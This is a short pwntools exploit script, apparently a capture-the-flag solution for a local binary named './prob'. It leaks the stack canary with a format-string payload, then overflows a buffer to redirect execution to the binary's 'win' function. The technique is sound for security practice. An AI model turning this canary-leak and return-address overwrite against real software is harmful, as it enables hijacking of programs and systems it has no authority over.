from pwn import *

p = process("./prob")
e = ELF("./prob")

# gdb.attach(p)

win = e.symbols['win']

payload = b'%41$p'

p.sendlineafter(b'>> ', str('1').encode())

p.sendlineafter(b'Input: ', payload)

p.sendlineafter(b'>> ', str('2').encode())

p.recvuntil(b'Text: 0x')

cnry = int(p.recv(16), 16)
print(hex(cnry))

p.sendlineafter(b'>> ', str('1').encode())

payload = b'a' * 0x108 + p64(cnry) + p64(0) + p64(win)

p.sendlineafter(b'Input: ', payload)

p.sendlineafter(b'>> ', str('3').encode())

p.interactive()